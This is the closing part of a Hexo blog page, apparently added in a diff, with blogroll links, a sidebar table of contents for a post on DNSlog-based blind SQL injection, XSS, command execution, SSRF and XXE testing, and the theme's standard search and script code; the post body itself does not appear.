+                    <a href="https://www.cnblogs.com/sakura521/" title="sakura" target="_blank">sakura</a>
+                  </span>
+                
+                  <span class="links-of-blogroll-item">
+                    <a href="https://www.haoyun.fit/" title="小透的少年江湖" target="_blank">小透的少年江湖</a>
+                  </span>
+                
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#如何利用DNSlog进行更高效率的无回显渗透"><span class="nav-text">如何利用DNSlog进行更高效率的无回显渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0-说在前面"><span class="nav-text">0.说在前面</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0-1-DNSlog工具"><span class="nav-text">0.1.DNSlog工具</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0-1-1-www-dnslog-cn使用方法"><span class="nav-text">0.1.1.www.dnslog.cn使用方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0-1-1-1-注意"><span class="nav-text">0.1.1.1.注意</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#解决方法"><span class="nav-text">解决方法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0-1-2-ceye-io使用方法"><span class="nav-text">0.1.2.ceye.io使用方法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-什么是DNSlog"><span class="nav-text">1.什么是DNSlog</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-DNSlog回显原理"><span class="nav-text">2.DNSlog回显原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-DNSlog通常用在哪些地方"><span class="nav-text">3.DNSlog通常用在哪些地方</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-SQL注入盲注"><span class="nav-text">3.1.SQL注入盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-1-UNC路径"><span class="nav-text">3.1.1.UNC路径</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-2-mysql的load-file-函数条件和secure-file-priv设置"><span class="nav-text">3.1.2.mysql的load_file()函数条件和secure_file_priv设置</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#3-1-2-1-注意事项"><span class="nav-text">3.1.2.1.注意事项</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-3-过程"><span class="nav-text">3.1.3.过程</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#3-1-3-1-注意"><span class="nav-text">3.1.3.1.注意</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-XSS盲打"><span class="nav-text">3.2.XSS盲打</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-1-介绍"><span class="nav-text">3.2.1.介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-2-过程"><span class="nav-text">3.2.2.过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-无回显的命令执行"><span class="nav-text">3.3.无回显的命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-3-1-介绍"><span class="nav-text">3.3.1.介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-3-2-过程"><span class="nav-text">3.3.2.过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-无回显的SSRF"><span class="nav-text">3.4.无回显的SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-4-1-介绍"><span class="nav-text">3.4.1.介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-4-2-过程"><span class="nav-text">3.4.2.过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-5-无回显的XXE（Blind-XXE）"><span class="nav-text">3.5.无回显的XXE（Blind XXE）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-5-1-介绍"><span class="nav-text">3.5.1.介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-5-2-过程"><span class="nav-text">3.5.2.过程</span></a></li></ol></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">joker0xxx3</span>
+
+  
+</div>
+
+<!-- 
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+-->
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
